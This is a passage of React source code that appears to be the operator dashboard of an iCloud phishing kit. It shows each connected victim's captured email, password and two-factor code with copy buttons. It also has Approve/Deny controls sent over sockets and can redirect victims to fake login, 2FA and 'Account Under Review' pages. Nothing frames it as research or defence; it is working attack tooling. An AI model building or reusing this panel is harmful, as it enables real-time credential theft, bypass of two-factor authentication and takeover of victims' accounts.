                                                                                                    className="ml-2 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"
                                                                                                >
                                                                                                    <MapPin className="w-3.5 h-3.5" />
                                                                                                </button>
                                                                                            </div>
                                                                                        </div>

                                                                                        <div>
                                                                                            <Label className="text-gray-500 text-xs mb-1.5 block">Organization</Label>
                                                                                            <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-xs text-gray-400">
                                                                                                {selectedConnection.geoData?.org || 'N/A'}
                                                                                            </div>
                                                                                        </div>
                                                                                    </>
                                                                                )}
                                                                            </div>

                                                                            {/* Control Actions */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, control: !prev.control }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Control Actions
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.control ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.control && (<>

                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Redirect to Page</Label>
                                                                                        <div className="flex gap-2">
                                                                                            <select
                                                                                                value={selectedRedirectPage}
                                                                                                onChange={(e) => setSelectedRedirectPage(e.target.value)}
                                                                                                className="flex-1 px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 focus:outline-none input-coolify"
                                                                                            >
                                                                                                <option value="">Select page</option>
                                                                                                <option value="landingPage">Landing Page</option>
                                                                                                <option value="loginPage">Login Page</option>
                                                                                                <option value="2faPage">2FA Page</option>
                                                                                                <option value="AURPage">Account Under Review</option>
                                                                                            </select>
                                                                                            <button
                                                                                                onClick={() => {
                                                                                                    handleRedirectPage(selectedConnection.id, selectedRedirectPage);
                                                                                                    setRedirectPageSent(true);
                                                                                                    setTimeout(() => setRedirectPageSent(false), 2000);
                                                                                                }}
                                                                                                disabled={!selectedRedirectPage}
                                                                                                className="px-4 py-2 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded text-sm disabled:opacity-50 disabled:cursor-not-allowed"
                                                                                            >
                                                                                                {redirectPageSent ? 'Sent' : 'Send'}
                                                                                            </button>
                                                                                        </div>
                                                                                    </div>
                                                                                    </>
                                                                                )}
                                                                            </div>

                                                                            {/* iCloud Credentials */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, credentials: !prev.credentials }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    iCloud Credentials
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.credentials ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.credentials && (
                                                                                    <>
                                                                                        {/* Login Data row: custom SVG + label; pending → details + Approve/Deny; approved/denied → label */}
                                                                                        <div className="space-y-3">
                                                                                            <div className="flex items-center gap-2 text-sm text-gray-300">
                                                                                                <svg className="w-4 h-4 shrink-0 text-[#f0b100]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M15 7h1a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2h-2"/><path d="M9 7H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2"/><path d="M9 11a4 4 0 1 0 6 0 4 4 0 0 0-6 0Z"/></svg>
                                                                                                <span className="font-medium text-white">Login Data:</span>
                                                                                                {!selectedConnection.loginData ? (
                                                                                                    <span className="text-gray-500">—</span>
                                                                                                ) : (() => {
                                                                                                    const status = getCredentialStatus(selectedConnection.id);
                                                                                                    const isNewLogin = status.loginVersion !== loginDataVersion;
                                                                                                    const effectiveLogin = (status.login !== 'pending' && !isNewLogin) ? status.login : 'pending';
                                                                                                    const emailPassBlock = (
                                                                                                        <div className="space-y-2 flex-1">
                                                                                                            <div><Label className="text-gray-500 text-xs mb-0.5 block">Email</Label><button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.email, 'email')} className="w-full p-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono text-left hover:border-[#f0b100]/50 cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="truncate">{selectedConnection.loginData.email}</span>{copiedField === 'email' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button></div>
                                                                                                            <div><Label className="text-gray-500 text-xs mb-0.5 block">Password</Label><button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.password, 'password')} className="w-full p-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono text-left hover:border-[#f0b100]/50 cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="truncate">{selectedConnection.loginData.password}</span>{copiedField === 'password' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button></div>
                                                                                                        </div>
                                                                                                    );
                                                                                                    if (effectiveLogin === 'approved') {
                                                                                                        return (<div className="flex flex-col gap-2 flex-1"><span className="text-green-500 flex items-center gap-1.5"><CheckCircle className="w-4 h-4" /> Approved</span>{emailPassBlock}</div>);
                                                                                                    }
                                                                                                    if (effectiveLogin === 'denied') {
                                                                                                        return (<div className="flex flex-col gap-2 flex-1"><span className="text-red-500 flex items-center gap-1.5"><XCircle className="w-4 h-4" /> Denied</span>{emailPassBlock}</div>);
                                                                                                    }
                                                                                                    return (
                                                                                                        <div className="flex flex-col gap-2 flex-1">
                                                                                                            <div className="flex items-center gap-2 flex-wrap">
                                                                                                                <button
                                                                                                                    onClick={() => { setLoginStatus(selectedConnection.id, 'approved', selectedConnection.loginData); socket.emit('approveSignIn', { socketId: selectedConnection.id }); }}
                                                                                                                    className="px-3 py-1.5 text-xs border border-[#f0b100] text-[#f0b100] bg-[#f0b100]/10 hover:bg-[#f0b100]/20 font-medium rounded flex items-center gap-1.5"
                                                                                                                >
                                                                                                                    <CheckCircle className="w-3.5 h-3.5" /> Approve
                                                                                                                </button>
                                                                                                                <button
                                                                                                                    onClick={() => { setLoginStatus(selectedConnection.id, 'denied', selectedConnection.loginData); socket.emit('denySignIn', { socketId: selectedConnection.id }); }}
                                                                                                                    className="px-3 py-1.5 text-xs border border-red-500 text-red-500 bg-red-500/10 hover:bg-red-500/20 font-medium rounded flex items-center gap-1.5"
                                                                                                                >
                                                                                                                    <XCircle className="w-3.5 h-3.5" /> Deny
                                                                                                                </button>
                                                                                                            </div>
                                                                                                            {emailPassBlock}
                                                                                                        </div>
                                                                                                    );
                                                                                                })()}
                                                                                            </div>

                                                                                            {/* 2FA Code row: custom SVG + "2FA Code: Waiting..." or code + Approve/Deny or Approved/Denied */}
                                                                                            <div className="flex items-center gap-2 text-sm text-gray-300">
                                                                                                <svg className="w-4 h-4 shrink-0 text-[#f0b100]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                                                                                <span className="font-medium text-white">2FA Code:</span>
                                                                                                {!selectedConnection.loginData?.twoFactorCode ? (
                                                                                                    <span className="text-gray-500">Waiting...</span>
                                                                                                ) : (() => {
                                                                                                    const status = getCredentialStatus(selectedConnection.id);
                                                                                                    const isNew2FA = status.twoFAVersion !== twoFAVersion;
                                                                                                    const effective2FA = (status.twoFA !== 'pending' && status.twoFA !== 'waiting' && !isNew2FA) ? status.twoFA : 'pending';
                                                                                                    const codeBlock = (
                                                                                                        <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.twoFactorCode, '2fa')} className="p-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-[#f0b100] font-mono font-bold hover:border-[#f0b100]/50 cursor-pointer flex items-center gap-2" title="Click to copy">
                                                                                                            {selectedConnection.loginData.twoFactorCode}
                                                                                                            {copiedField === '2fa' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}
                                                                                                        </button>
                                                                                                    );
                                                                                                    if (effective2FA === 'approved') {
                                                                                                        return (<div className="flex items-center gap-2 flex-wrap"><span className="text-green-500 flex items-center gap-1.5"><CheckCircle className="w-4 h-4" /> Approved</span>{codeBlock}</div>);
                                                                                                    }
                                                                                                    if (effective2FA === 'denied') {
                                                                                                        return (<div className="flex items-center gap-2 flex-wrap"><span className="text-red-500 flex items-center gap-1.5"><XCircle className="w-4 h-4" /> Denied</span>{codeBlock}</div>);
                                                                                                    }
                                                                                                    return (
                                                                                                        <div className="flex items-center gap-2 flex-wrap">
                                                                                                            {codeBlock}
                                                                                                            <button
                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'approved', selectedConnection.loginData.twoFactorCode); socket.emit('approve2fa', { socketId: selectedConnection.id }); }}
                                                                                                                className="px-3 py-1.5 text-xs border border-[#f0b100] text-[#f0b100] bg-[#f0b100]/10 hover:bg-[#f0b100]/20 font-medium rounded flex items-center gap-1.5"
                                                                                                            >
                                                                                                                <CheckCircle className="w-3.5 h-3.5" /> Approve
                                                                                                            </button>
                                                                                                            <button
                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'denied', selectedConnection.loginData.twoFactorCode); socket.emit('deny2fa', { socketId: selectedConnection.id }); }}
                                                                                                                className="px-3 py-1.5 text-xs border border-red-500 text-red-500 bg-red-500/10 hover:bg-red-500/20 font-medium rounded flex items-center gap-1.5"
                                                                                                            >
                                                                                                                <XCircle className="w-3.5 h-3.5" /> Deny
                                                                                                            </button>
                                                                                                        </div>
                                                                                                    );
                                                                                                })()}
                                                                                            </div>
                                                                                        </div>

                                                                                        {/* Redirect to URL - only when we have login data */}
                                                                                        {selectedConnection.loginData && (
                                                                                            <>
                                                                                                <div>
                                                                                                    <Label className="text-gray-500 text-xs mb-1.5 block">Redirect to URL</Label>
                                                                                                    <div className="flex gap-2">
                                                                                                        <input
                                                                                                            type="url"
                                                                                                            placeholder="https://example.com"
                                                                                                            value={redirectUrl}
                                                                                                            onChange={(e) => setRedirectUrl(e.target.value)}
                                                                                                            className="flex-1 px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 placeholder-gray-500 focus:outline-none input-coolify"
                                                                                                        />
                                                                                                        <button
                                                                                                            onClick={() => {
                                                                                                                if (redirectUrl.trim()) {
                                                                                                                    socket.emit('redirect', { socketId: selectedConnection.id, url: redirectUrl });
                                                                                                                    setRedirectUrl('');
                                                                                                                    setRedirectUrlSent(true);
                                                                                                                    setTimeout(() => setRedirectUrlSent(false), 2000);
                                                                                                                }
                                                                                                            }}
                                                                                                            className="px-4 py-2 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded text-sm"
                                                                                                        >
                                                                                                            {redirectUrlSent ? 'Sent' : 'Send'}
                                                                                                        </button>
                                                                                                    </div>
                                                                                                </div>
                                                                                                {selectedConnection.lastRedirect && (
                                                                                                    <div className="p-3 bg-blue-500/10 border border-blue-500/20 rounded text-xs text-blue-400">
                                                                                                        Last redirect: {selectedConnection.lastRedirect.url}
                                                                                                    </div>
                                                                                                )}
                                                                                            </>
                                                                                        )}
                                                                                    </>
                                                                                )}
                                                                            </div>

                                                                            {/* Timing Information */}
                                                                            <div className="space-y-4">
                                                                                <button
                                                                                    onClick={() => setSectionsOpen(prev => ({ ...prev, timing: !prev.timing }))}
                                                                                    className="w-full text-base font-semibold text-white border-b border-[#2C2C2E] pb-2 flex items-center justify-between hover:text-[#f0b100] transition-colors"
                                                                                >
                                                                                    Connection Timing
                                                                                    <ChevronDown className={`w-4 h-4 transition-transform ${sectionsOpen.timing ? '' : '-rotate-90'}`} />
                                                                                </button>

                                                                                {sectionsOpen.timing && (
                                                                                    <div className="grid grid-cols-2 gap-3">
                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Connected At</Label>
                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                            {formatFullDate(selectedConnection.connectedAt)}
                                                                                        </div>
                                                                                    </div>

                                                                                    <div>
                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Duration</Label>
                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
                                                                                            {formatTimeAgo(selectedConnection.connectedAt)}
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                )}
                                                                            </div>
                                                                        </div>

                                                                        <SheetFooter className="mt-6 pt-6 border-t border-[#2C2C2E]">
                                                                            <div className="flex gap-3 w-full">
                                                                                <button
                                                                                    onClick={() => {
                                                                                        const data = {
                                                                                            ...selectedConnection,
                                                                                            fetchedAt: new Date().toISOString()
                                                                                        };
                                                                                        copyToClipboard(JSON.stringify(data, null, 2));
                                                                                    }}
                                                                                    className="flex-1 px-4 py-2 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded text-sm flex items-center justify-center gap-2"
                                                                                >
                                                                                    <Copy className="w-4 h-4" />
                                                                                    Copy JSON
                                                                                </button>
                                                                                <SheetClose asChild>
                                                                                    <button className="flex-1 px-4 py-2 bg-[#28282A] hover:bg-[#2C2C2E] text-gray-300 font-medium rounded text-sm">
                                                                                        Close
                                                                                    </button>
                                                                                </SheetClose>
                                                                            </div>
                                                                        </SheetFooter>
                                                                    </>
                                                                )}
                                                                </SheetContent>
                                                            </Sheet>
                                                        </div>
                                                    </div>
                                                </div>

                                            ))}
                                        </div>

                                        {/* Pagination */}
                                        {totalPages > 1 && (
                                            <div className="flex items-center justify-between px-4 py-3 border-t border-[#2C2C2E] bg-[#1C1C1E]">
                                                <div className="text-xs text-gray-400 font-medium">
                                                    Showing {startIndex + 1} to {Math.min(endIndex, filteredConnections.length)} of{' '}
                                                    {filteredConnections.length} connections
                                                </div>

                                                <div className="flex items-center gap-1">
                                                    <button
                                                        onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                                                        disabled={currentPage === 1}
                                                        className="p-2 hover:bg-[#28282A] rounded disabled:opacity-30 disabled:cursor-not-allowed transition-colors text-gray-400"
                                                        aria-label="Previous page"
                                                    >
                                                        <ChevronLeft className="w-4 h-4" strokeWidth={2} />
                                                    </button>

                                                    {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                                                        let pageNum;
                                                        if (totalPages <= 5) {
                                                            pageNum = i + 1;
                                                        } else if (currentPage <= 3) {
                                                            pageNum = i + 1;
                                                        } else if (currentPage >= totalPages - 2) {
                                                            pageNum = totalPages - 4 + i;
                                                        } else {
                                                            pageNum = currentPage - 2 + i;
                                                        }

                                                        return (
                                                            <button
                                                                key={pageNum}
                                                                onClick={() => setCurrentPage(pageNum)}
                                                                className={`min-w-[32px] h-8 rounded text-sm font-medium transition-colors ${currentPage === pageNum
                                                                    ? 'bg-[#f0b100] text-black'
                                                                    : 'hover:bg-[#28282A] text-gray-400 hover:text-gray-300'
                                                                    }`}
                                                            >
                                                                {pageNum}
                                                            </button>
                                                        );
                                                    })}

                                                    <button
                                                        onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                                                        disabled={currentPage === totalPages}
                                                        className="p-2 hover:bg-[#28282A] rounded disabled:opacity-30 disabled:cursor-not-allowed transition-colors text-gray-400"
                                                        aria-label="Next page"
                                                    >
                                                        <ChevronRight className="w-4 h-4" strokeWidth={2} />
                                                    </button>
                                                </div>
                                            </div>
                                        )}
                                </div>
                            )}
                        </div>

                </div>
            </main>
        </div>
    );
}
